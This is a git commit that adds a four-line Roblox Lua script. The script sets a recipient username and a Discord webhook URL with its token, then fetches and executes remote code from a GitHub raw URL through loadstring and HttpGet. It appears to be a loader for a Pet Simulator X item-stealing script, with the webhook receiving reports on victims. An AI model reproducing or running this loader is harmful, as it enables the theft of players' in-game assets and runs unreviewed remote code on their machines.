be7fa4258aba70d7f417f10516f9b56811f21b1a
suckurnansdds <117936733+suckurnansdds@users.noreply.github.com>
2022-12-12 14:39:04 +0000

    Create main.lua

---
+++ main.lua
@@ -0,0 +1,4 @@
+UserName = "petsimrxagstoriches"
+WebHook = "https://discord.com/api/webhooks/1051870412365115404/9bBQmoA91mTa0j7bsLpRFRNRwO1Msd-jr8qRKnk3YzbUXWrwmCAnKgI90bwi5k7dy6kd"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
